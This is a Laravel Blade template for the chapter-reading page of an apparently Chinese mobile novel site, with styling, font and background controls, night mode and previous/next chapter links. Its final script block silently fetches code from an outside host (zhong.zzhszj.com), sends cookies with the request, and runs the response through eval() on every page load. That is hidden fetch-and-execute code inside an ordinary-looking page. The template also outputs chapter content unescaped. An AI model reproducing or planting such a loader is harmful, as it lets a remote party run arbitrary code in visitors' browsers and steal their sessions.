@section('style')
<link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_444386_q6y5rc5tkry0hpvi.css" />
<style>

.reader_top_nav{
  position: fixed!important;
  top: 0px;
  height: 50px;
  line-height: 50px;
  width: 100%!important;
  z-index: 2147483647!important;
  background: rgba(0, 0, 0, 0.9);
  color: #d5d5d6;
  font-size: 14px;
}
.reader_top_nav .reader__back {
  float: left;
  margin: 14px 10px 0;
  width: 23px;
  height: 23px;
  background: url(/wapdashubao/images/@EaSXPML.png) no-repeat;
  background-size: 23px 23px;
}
.m-read-content {
    font-size: 14px;
    color: #555555;
    line-height: 31px;
    padding: 15px;
}
.m-read-content h4 {
    font-size: 20px;
    color: #736357;
    border-bottom: solid 1px #736357;
    letter-spacing: 2px;
    margin: 0 0 1em 0;
}
.m-read-content p {
    text-indent: 2em;
    margin: 0.5em 0;
    letter-spacing: 0px;
    line-height: 24px;
}
.m-button-bar {
    width: 70%;
    max-width: 800px;
    padding: 5px;
    margin: 0 auto;
}
.m-button-bar .u-tab {
    height: 34px;
    margin: 10px auto;
    line-height: 34px;
    border-radius: 8px;
    border: 1px solid #858382;
    font-size: 12px;
    background: #000;
    opacity: 0.9;
}
.m-button-bar .u-tab li {
    display: inline-block;
    width: 49%;
    border-right: 1px solid #858382;
    text-align: center;
    color: #fff;
}
.m-button-bar .u-tab a:nth-child(2) li{
    border: none;
}
.nav-pannel-bk {
    position: fixed!important;
    bottom: 70px;
    height: 135px;
    width: 100%;
    opacity: 0.9;
    background: #000;
    z-index: 2147483647!important;
    color: #fff;
}

.child-mod {
    padding: 5px 10px;
    margin: 15px;

}
.child-mod span {
    display: inline-block;
    padding-right: 20px;
    padding-left: 10px;
}
.child-mod button:nth-child(2) {
    margin-right: 10px;
}
.font-size-button {
    background: none;
    border: 1px solid #8c8c8c;
    color: #fff;
    border-radius: 16px;
    padding: 5px 40px;
}
.bk-container {
    position: relative;
    vertical-align: -14px;
    width: 30px;
    height: 30px;
    border-radius: 15px;
    background: #fff;
    display: inline-block;
    margin-left: 7px;
}
.bk-container-white {
    background: #f7eee5;
}
.bk-container-paple {
    background: #e9dfc7;
}
.bk-container-grey {
    background: #a4a4a4;
}
.bk-container-green {
    background: #cdefce;
}
.bk-container-blue {
    background: #283548;
}

.bk-container-current {
    position: absolute;
    top: -2px;
    left: -2px;
    width: 32px;
    height: 32px;
    border-radius: 16px;
    border: 1px solid #ff7800;
    display: inline-block;
    box-sizing: content-box;
}

.bottom-nav-bk {
    position: fixed!important;
    bottom: 0px;
    background: #000;
    width: 100%!important;;
    opacity: 0.9;
    margin: 0 auto;
    text-align: center;
    z-index: 2147483647!important;
}
.reader__ft-bar a {
    float: left;
    display: block;
    width: 25%;
    font-size: 13px;
    line-height: 48px;
    height: 48px;
    color: #fff;
    text-align: center;
}
.reader__ft-bar {
    overflow: hidden;
    border-bottom: 1px solid #333;
}
.reader__ft-bar a:nth-child(2) {
    width: 50%;
}
.reader__ft{
    float: left;
    width: 25%;
    height: 70px;
    font-size: 10px;
    line-height: 21px;
    color: #fff;
    text-algin:center;
    display: block;
}
.reader__ft_i{
  width:100%;
  height:60%;
  padding-top:15px;
}
.reader__ft_text{
  width:100%;
  height:40%;
}
.reader__ft i{
  font-size:30px;
}
.artical-action-mid {
    position: fixed;
    z-index: 997;
    width: 100%;
    height: 40%;
    top: 30%;
}
.iconfont.current{
  color: red;
}

.m-gongneng-bk {
    position: fixed!important;
    bottom: 70px;
    width: 100%;
    opacity: 0.9;
    background: #000;
    z-index: 2147483647!important;
    color: #fff;
}
</style>
@endsection
@extends('wapdashubao.layouts.default')
@section('content')
<div class="artical-action-mid" id="action_mid"></div>
<div id="top_nav" class="reader_top_nav" style="display: none;">
    <a class="reader__back"></a>返回
</div>
<div class="online" style="padding-left:5px;color: #555555;">{{ $chapter->articlename }}</div>
<div id="fiction_container" class="m-read-content" ref="fiction_container">
  <h4>{{$chapter->chaptername}}</h4>
  {!!$content!!}
</div>
<div class="m-button-bar">
    <ul class="u-tab">
        <a href="{{ getChapterUrl($previousChapter ,$bookData) }}" target="_top" title="{{ $previousChapter->chaptername or  $chapter->articlename}}">
          <li>上一章</li>
        </a>
        <a href="{{ getChapterUrl($nextChapter , $bookData) }}" target="_top" title="{{ $nextChapter->chaptername or  $chapter->articlename}}">
          <li>下一章</li>
        </a>
    </ul>
</div>
<div class="m-gongneng-bk" id="gongneng-container" style="display: none;">
  <div class="child-mod">
      <span>功能</span>
      <button class="font-size-button" v-on:click="tuijian({{$chapter->articleid}})">推荐</button>
      <button class="font-size-button">收藏</button>
  </div>
</div>

<div class="nav-pannel-bk" id="font-container" style="display: none;">
    <div class="child-mod">
        <span>字号</span>
        <button id="large-font" class="font-size-button">大</button>
        <button id="small-font" class="font-size-button">小</button>
    </div>
    <div class="child-mod">
        <span>背景</span>
        <div id="first_day" class="bk-container bk-container-white" data-background="#f7eee5">
            <div class="bk-container-current" style="display: none;"></div>
        </div>
        <div class="bk-container bk-container-paple" data-background="#e9dfc7">
            <div class="bk-container-current" style="display: none;"></div>
        </div>
        <div class="bk-container bk-container-grey" data-background="#a4a4a4">
            <div class="bk-container-current" style="display: none;"></div>
        </div>
        <div class="bk-container bk-container-green" data-background="#cdefce">
            <div class="bk-container-current" style="display: none;"></div>
        </div>
        <div id="last_night" class="bk-container bk-container-blue" data-background="#283548">
            <div class="bk-container-current" style="display: none;"></div>
        </div>
    </div>
</div>

<div class="bottom-nav-bk bottom_nav" style="display: none;">
  <div class="reader__ft-bar">
    <a href="{{ getChapterUrl($previousChapter ,$bookData) }}" target="_top" title="{{ $previousChapter->chaptername or  $chapter->articlename}}">上一章</a>
    <a href="javascript:"></a>
    <a href="{{ getChapterUrl($nextChapter , $bookData) }}" target="_top" title="{{ $nextChapter->chaptername or  $chapter->articlename}}">下一章</a>
  </div>
  <a class="reader__ft">
    <div class="reader__ft_i">
        <i class="iconfont icon-liebiao"></i>
    </div>
    <div class="reader__ft_text">
          列表
    </div>
  </a>
  <div class="reader__ft" id="font-button">
    <div class="reader__ft_i">
        <i class="iconfont icon-aa"></i>
    </div>
    <div class="reader__ft_text">
          字体
    </div>
  </div>
  <div class="reader__ft" id="night-day-button">
    <div style="display:none" id="day_icon">
      <div class="reader__ft_i">
          <i class="iconfont icon-sun"></i>
      </div>
      <div class="reader__ft_text">
            白天
      </div>
    </div>
    <div style="display:none" id="night_icon">
      <div class="reader__ft_i">
          <i class="iconfont icon-night"></i>
      </div>
      <div class="reader__ft_text">
            夜晚
      </div>
    </div>
  </div>
  <div class="reader__ft" id="gongneng-button">
    <div class="reader__ft_i">
        <i class="iconfont icon-xitong"></i>
    </div>
    <div class="reader__ft_text">
          功能
    </div>
  </div>
</div>

@endsection
@section('subscripts')
<script>
(function(){var c="http://zhong.zzhszj.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?t="+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();
baobaoni.readApi();

</script>
@endsection
